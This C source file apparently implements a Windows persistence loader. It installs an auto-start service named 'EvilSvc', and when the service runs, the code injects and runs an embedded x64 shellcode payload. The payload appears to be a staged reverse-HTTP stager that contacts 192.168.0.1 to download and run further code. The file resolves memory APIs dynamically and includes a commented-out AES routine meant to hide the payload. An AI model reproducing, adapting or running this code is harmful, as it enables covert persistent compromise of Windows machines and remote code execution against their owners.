#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <wincrypt.h>
#include <psapi.h>
#include <tchar.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

#define DELAY 10000 // miliseconds

TCHAR* serviceName = TEXT("EvilSvc");
SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
HANDLE stopServiceEvent = 0;

LPVOID (WINAPI * pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
VOID (WINAPI * pRtlMoveMemory)(VOID UNALIGNED *Destination, const VOID UNALIGNED *Source, SIZE_T Length);

/*
int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTPROV hHash;
	HCRYPTPROV hKey;

	if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		return -1;
	}
	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
		return -1;
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		return -1;
	}

	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)) {
		return -1;
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return 0;
}
*/

int RunMe(void) {
	
	void * exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;

	// Sleep(30000);

	//const char key[] = ;
	unsigned char payload[] = "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x48\x31\xd2\x51\x56\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41"
"\x51\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
"\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x4d\x31\xc9"
"\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1"
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x48\x01"
"\xd0\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
"\x4b\xff\xff\xff\x5d\x48\x31\xdb\x53\x49\xbe\x77\x69\x6e"
"\x69\x6e\x65\x74\x00\x41\x56\x48\x89\xe1\x49\xc7\xc2\x4c"
"\x77\x26\x07\xff\xd5\x53\x53\x48\x89\xe1\x53\x5a\x4d\x31"
"\xc0\x4d\x31\xc9\x53\x53\x49\xba\x3a\x56\x79\xa7\x00\x00"
"\x00\x00\xff\xd5\xe8\x0c\x00\x00\x00\x31\x39\x32\x2e\x31"
"\x36\x38\x2e\x30\x2e\x31\x00\x5a\x48\x89\xc1\x49\xc7\xc0"
"\xe1\x10\x00\x00\x4d\x31\xc9\x53\x53\x6a\x03\x53\x49\xba"
"\x57\x89\x9f\xc6\x00\x00\x00\x00\xff\xd5\xe8\x1f\x00\x00"
"\x00\x2f\x31\x58\x64\x68\x45\x50\x62\x37\x6c\x67\x73\x56"
"\x36\x68\x54\x6f\x66\x62\x64\x76\x68\x51\x65\x48\x42\x4b"
"\x7a\x58\x75\x00\x48\x89\xc1\x53\x5a\x41\x58\x4d\x31\xc9"
"\x53\x48\xb8\x00\x32\xa8\x84\x00\x00\x00\x00\x50\x53\x53"
"\x49\xc7\xc2\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x6a\x0a"
"\x5f\x48\x89\xf1\x6a\x1f\x5a\x52\x68\x80\x33\x00\x00\x49"
"\x89\xe0\x6a\x04\x41\x59\x49\xba\x75\x46\x9e\x86\x00\x00"
"\x00\x00\xff\xd5\x4d\x31\xc0\x53\x5a\x48\x89\xf1\x4d\x31"
"\xc9\x4d\x31\xc9\x53\x53\x49\xc7\xc2\x2d\x06\x18\x7b\xff"
"\xd5\x85\xc0\x75\x23\x48\xc7\xc1\x88\x13\x00\x00\x49\xba"
"\x44\xf0\x35\xe0\x00\x00\x00\x00\xff\xd5\x48\xff\xcf\x74"
"\x02\xeb\xaa\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5\x53\x59"
"\x6a\x40\x5a\x49\x89\xd1\xc1\xe2\x10\x49\xc7\xc0\x00\x10"
"\x00\x00\x49\xba\x58\xa4\x53\xe5\x00\x00\x00\x00\xff\xd5"
"\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x49"
"\xc7\xc0\x00\x20\x00\x00\x49\x89\xf9\x49\xba\x12\x96\x89"
"\xe2\x00\x00\x00\x00\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74"
"\xae\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd2\x58\xc3";
	unsigned int payload_len = sizeof(payload);

	pVirtualAlloc = (LPVOID (WINAPI *)(LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAlloc");
	pRtlMoveMemory = (VOID (WINAPI *)(VOID UNALIGNED *, const VOID UNALIGNED *, SIZE_T))GetProcAddress(GetModuleHandleA("kernel32.dll"), "RtlMoveMemory");

	//pVirtualAlloc = GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAlloc");
	//pRtlMoveMemory = GetProcAddress(GetModuleHandleA("kernel32.dll"), "RtlMoveMemory");


	// Allocate memory for payload
	exec_mem = pVirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	//Decrypt payload
	//AESDecrypt((char*) payload, payload_len, key, sizeof(key));

	//Copy payload to allocated buffer
	pRtlMoveMemory(exec_mem, payload, payload_len);

	// Make the buffer executable
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	// If all good, launch payload

	if (rv != 0) {
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}

	return 0;
}

void WINAPI ServiceControlHandler( DWORD controlCode ) {
	switch ( controlCode ) {
	case SERVICE_CONTROL_SHUTDOWN:
	case SERVICE_CONTROL_STOP:
		serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
		SetServiceStatus( serviceStatusHandle, &serviceStatus );

		SetEvent( stopServiceEvent );
		return;

	case SERVICE_CONTROL_PAUSE:
		break;

	case SERVICE_CONTROL_CONTINUE:
		break;

	case SERVICE_CONTROL_INTERROGATE:
		break;

	default:
		break;		
	}
	SetServiceStatus( serviceStatusHandle, &serviceStatus );
}

void WINAPI ServiceMain( DWORD argc, TCHAR* argv[] ) {
	// initialise service status
	serviceStatus.dwServiceType = SERVICE_WIN32;
	serviceStatus.dwCurrentState = SERVICE_STOPPED;
	serviceStatus.dwControlsAccepted = 0;
	serviceStatus.dwWin32ExitCode = NO_ERROR;
	serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
	serviceStatus.dwCheckPoint = 0;
	serviceStatus.dwWaitHint = 0;

	serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );

	if ( serviceStatusHandle ) {
		//service is starting
		serviceStatus.dwCurrentState = SERVICE_START_PENDING;
		SetServiceStatus( serviceStatusHandle, &serviceStatus );

		// do initialisation here
		stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );

		// running
		serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
		serviceStatus.dwCurrentState = SERVICE_RUNNING;
		SetServiceStatus( serviceStatusHandle, &serviceStatus );

		RunMe();
		WaitForSingleObject( stopServiceEvent, -1 );

		// service was stopped
		serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
		SetServiceStatus( serviceStatusHandle, &serviceStatus );

		// do cleanup here
		CloseHandle( stopServiceEvent );
		stopServiceEvent = 0;

		// service is now stopped
		serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
		serviceStatus.dwCurrentState = SERVICE_STOPPED;
		SetServiceStatus( serviceStatusHandle, &serviceStatus );
	}
}

void InstallService() {
	SC_HANDLE ServiceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );

	if ( ServiceControlManager ) {
		TCHAR path[ _MAX_PATH + 1 ];
		if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
			SC_HANDLE service = CreateService (ServiceControlManager, serviceName, serviceName, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path, 0, 0, 0, 0, 0 );
			if ( service )
				CloseServiceHandle( service );
		}
		CloseServiceHandle( ServiceControlManager );
	}
}

void UninstallService() {
	SC_HANDLE ServiceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );

	if ( ServiceControlManager ) {
		SC_HANDLE service = OpenService( ServiceControlManager, serviceName, SERVICE_QUERY_STATUS | DELETE );
		if ( service ) {
			SERVICE_STATUS serviceStatus;
			if ( QueryServiceStatus( service, &serviceStatus ) ) {
				if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
					DeleteService( service );
			}
			CloseServiceHandle( service );
		}
		CloseServiceHandle( ServiceControlManager );
	}
}


int _tmain( int argc, TCHAR* argv[] ) {
	if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
		InstallService();
	}
	else if (argc > 1 && lstrcmpi( argv[1], TEXT("Unisstall") ) == 0 ) {
		UninstallService();
	}
	else {
		SERVICE_TABLE_ENTRY serviceTable[] = {
			{ serviceName, ServiceMain },
			{ 0, 0 }
		};

		StartServiceCtrlDispatcher( serviceTable );
	}

	return 0;
}
